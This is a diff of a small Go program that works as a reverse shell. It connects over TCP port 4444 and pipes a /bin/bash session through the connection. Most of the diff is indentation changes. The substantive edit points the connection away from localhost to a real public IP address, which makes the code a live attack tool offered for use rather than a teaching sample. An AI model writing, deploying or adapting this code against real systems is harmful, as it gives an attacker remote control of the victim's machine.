@@ -1,43 +1,43 @@
 package main
 
 import (
-    "fmt"
-    "net"
-    "os/exec"
-    "os"
-    //"io"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	//"io"
 )
 
 //executes a bash shell and pipes in/out/err over the connection
 func createShell(connection net.Conn) {
-    var message string = "successful connection from " + connection.LocalAddr().String()
-    _, err := connection.Write([]byte(message + "\n"))
-    if err != nil {
-        fmt.Println("An error occurred trying to write to the outbound connection:", err)
-        os.Exit(2)
-    }
+	var message string = "successful connection from " + connection.LocalAddr().String()
+	_, err := connection.Write([]byte(message + "\n"))
+	if err != nil {
+		fmt.Println("An error occurred trying to write to the outbound connection:", err)
+		os.Exit(2)
+	}
 
-    cmd := exec.Command("/bin/bash")
-    cmd.Stdin = connection
-    cmd.Stdout = connection
-    cmd.Stderr = connection
+	cmd := exec.Command("/bin/bash")
+	cmd.Stdin = connection
+	cmd.Stdout = connection
+	cmd.Stderr = connection
 
-    cmd.Run()
+	cmd.Run()
 }
 
 func main() {
-    var tcpPort string = "4444"
-    connection, err := net.Dial("tcp", "127.0.0.1:" + tcpPort) //connect to the listener on another machine
-    if err != nil {
-        fmt.Println("An error occurred trying to connect to the target:", err)
-        os.Exit(1)
-    }
-    fmt.Println("Successfully connected to the target")
+	var tcpPort string = "4444"
+	connection, err := net.Dial("tcp", "158.247.211.13:"+tcpPort) //connect to the listener on another machine
+	if err != nil {
+		fmt.Println("An error occurred trying to connect to the target:", err)
+		os.Exit(1)
+	}
+	fmt.Println("Successfully connected to the target")
 
-    createShell(connection)
-    /*for {
-        checkConnection(connection)
-    }*/
+	createShell(connection)
+	/*for {
+	    checkConnection(connection)
+	}*/
 }
 
 //constantly checks that the connection is still alive
